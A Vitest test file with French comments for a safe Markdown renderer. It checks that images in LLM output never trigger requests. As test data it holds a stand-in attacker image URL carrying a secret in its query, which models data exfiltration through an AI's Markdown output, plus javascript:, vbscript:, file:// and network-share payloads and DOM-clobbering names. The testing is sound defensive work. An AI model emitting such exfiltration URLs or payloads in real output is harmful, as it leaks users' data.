import { cleanup, render, screen } from "@testing-library/react";
import { Streamdown } from "streamdown";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

// Issue 642 : une image distante dans une sortie du LLM n'émet aucune requête
// tant que l'utilisateur ne la demande pas.
const mocks = vi.hoisted(() => ({ fetch: vi.fn() }));

vi.mock("@tauri-apps/plugin-http", () => ({ fetch: mocks.fetch }));

import {
  type AttachmentResolver,
  AttachmentResolverContext,
} from "@syntheo/editor/node-views";
import { streamdownIcons } from "@syntheo/ui/components/streamdown-icons";

import {
  safeRehypePlugins,
  SafeMarkdownImage,
  summaryRehypePlugins,
} from "./safe-markdown";

import { streamdownComponents } from "~/session/components/streamdown";

const REMOTE = "https://attaquant.example/p.png?d=secret";

function renderMarkdown(
  markdown: string,
  components: Record<string, unknown> = streamdownComponents,
) {
  return render(
    <Streamdown
      icons={streamdownIcons}
      components={components as never}
      rehypePlugins={safeRehypePlugins}
      mode="static"
      isAnimating={false}
      controls={false}
      linkSafety={{ enabled: false }}
    >
      {markdown}
    </Streamdown>,
  );
}

function images() {
  return Array.from(document.querySelectorAll("img"));
}

describe("rendu sûr des images", () => {
  beforeEach(() => {
    mocks.fetch.mockReset();
  });
  afterEach(() => {
    cleanup();
  });

  // Issue 678 : une image distante n'est plus chargée du tout, même au clic.
  it.each([
    ["synthèse", streamdownComponents],
    ["chat", { img: SafeMarkdownImage }],
  ])(
    "%s : une image distante Markdown ou HTML laisse son texte alternatif, sans requête",
    (_, components) => {
      renderMarkdown(
        `Texte\n\n![logo](${REMOTE})\n\n<img src="${REMOTE}" alt="brut">`,
        components,
      );
      expect(images()).toEqual([]);
      expect(screen.queryByRole("button")).toBeNull();
      expect(document.body.textContent).toContain("logo");
      expect(document.body.textContent).toContain("brut");
      expect(document.body.innerHTML).not.toContain("attaquant.example");
      expect(mocks.fetch).not.toHaveBeenCalled();
    },
  );

  // Issue 677 : une adresse de fichier local (protocole asset) ou de chemin
  // réseau n'est jamais rendue ; seul le texte alternatif reste. `asset://` et
  // `data:` sont déjà retirés par la sanitisation de Streamdown.
  it.each([
    ["synthèse", streamdownComponents],
    ["chat", { img: SafeMarkdownImage }],
  ])("%s : une image de fichier local n'est pas rendue", (_, components) => {
    renderMarkdown(
      "![local](http://asset.localhost/tmp/b.png)\n\n![reseau](http://asset.localhost/%5C%5C192.0.2.1%5Cshare%5Cc.png)",
      components,
    );
    expect(images()).toEqual([]);
    expect(screen.queryByRole("button")).toBeNull();
    expect(document.body.textContent).toContain("local");
    expect(document.body.textContent).toContain("reseau");
    expect(document.body.innerHTML).not.toContain("192.0.2.1");
  });

  it("préfixe les id et name du HTML brut (pas de clobbering de document)", () => {
    renderMarkdown(
      '<a name="createElement" id="getElementById" href="https://example.com">lien</a>',
    );
    const link = screen.getByText("lien").closest("a");
    expect(link?.getAttribute("name")).toBe("user-content-createElement");
    expect(link?.getAttribute("id")).toBe("user-content-getElementById");
    expect(typeof document.createElement).toBe("function");
  });
});

// Issue 801 : une image bloquée ne laisse que son texte alternatif, quelle que
// soit son adresse, sans libellé anglais ajouté par le durcissement commun.
// Rendu réel : Streamdown et les plugins de safe-markdown, sans simulation.

const PIXEL =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";
const KNOWN_ATTACHMENT_SRC =
  "asset://localhost/sessions/s1/attachments/capture%201.png";
const resolveKnownAttachment: AttachmentResolver = (attachmentId) =>
  attachmentId === "capture 1.png"
    ? {
        path: "/sessions/s1/attachments/capture 1.png",
        src: KNOWN_ATTACHMENT_SRC,
      }
    : null;

type View = [
  label: string,
  rehypePlugins: typeof safeRehypePlugins,
  components: Record<string, unknown>,
];

const VIEWS: View[] = [
  ["chat", safeRehypePlugins, { img: SafeMarkdownImage }],
  ["relecture d'une proposition", summaryRehypePlugins, streamdownComponents],
];

function renderView(view: View, markdown: string) {
  const [, rehypePlugins, components] = view;
  return render(
    <AttachmentResolverContext.Provider value={resolveKnownAttachment}>
      <Streamdown
        icons={streamdownIcons}
        components={components as never}
        rehypePlugins={rehypePlugins}
        mode="static"
        isAnimating={false}
        controls={false}
        linkSafety={{ enabled: false }}
      >
        {markdown}
      </Streamdown>
    </AttachmentResolverContext.Provider>,
  );
}

describe("image bloquée : texte alternatif seul (issue 801)", () => {
  afterEach(() => {
    cleanup();
  });

  const blocked = [
    ["asset", "asset://localhost/tmp/b.png"],
    ["file", "file:///etc/secret.png"],
    ["https", "https://attaquant.example/p.png"],
    ["http", "http://attaquant.example/p.png"],
    ["asset.localhost", "http://asset.localhost/tmp/b.png"],
    ["javascript", "javascript:alert(1)"],
    ["vbscript", "vbscript:msgbox(1)"],
    ["chemin", "/home/user/secret.png"],
    ["attachment inconnue", "attachment://autre.png"],
    ["data non image", "data:text/html;base64,PGI+"],
  ] as const;

  describe.each(VIEWS)("%s", (...view) => {
    it.each(blocked)("adresse %s en Markdown", (_label, src) => {
      const { container } = renderView(view, `![Schéma](<${src}>)`);
      expect(container.querySelector("img")).toBeNull();
      expect(container.textContent?.trim()).toBe("Schéma");
    });

    it.each(blocked)("adresse %s en HTML brut", (_label, src) => {
      const { container } = renderView(
        view,
        `<p><img src="${src}" alt="Schéma"></p>`,
      );
      expect(container.querySelector("img")).toBeNull();
      expect(container.textContent?.trim()).toBe("Schéma");
    });

    it("adresse vide", () => {
      const { container } = renderView(
        view,
        `<p><img src="" alt="Schéma"></p>`,
      );
      expect(container.querySelector("img")).toBeNull();
      expect(container.textContent?.trim()).toBe("Schéma");
    });

    it.each(blocked)(
      "adresse %s sans texte alternatif : rien",
      (_label, src) => {
        const { container } = renderView(view, `Avant ![](<${src}>) après`);
        expect(container.querySelector("img")).toBeNull();
        expect(container.textContent?.replace(/\s+/g, " ").trim()).toBe(
          "Avant après",
        );
      },
    );
  });

  it("relecture : une pièce jointe connue de la session reste affichée", () => {
    const { container } = renderView(
      VIEWS[1]!,
      "![Tableau](attachment://capture%201.png)",
    );
    expect(container.querySelector("img")?.getAttribute("src")).toBe(
      KNOWN_ATTACHMENT_SRC,
    );
  });

  // `data:` est retiré par la sanitisation de Streamdown avant le rendu `img` :
  // comme avant, l'image n'est pas affichée ; seul son texte alternatif reste.
  it.each(VIEWS)("%s : une image data:image reste non affichée", (...view) => {
    const { container } = renderView(view, `![Pixel](${PIXEL})`);
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent?.trim()).toBe("Pixel");
  });
});
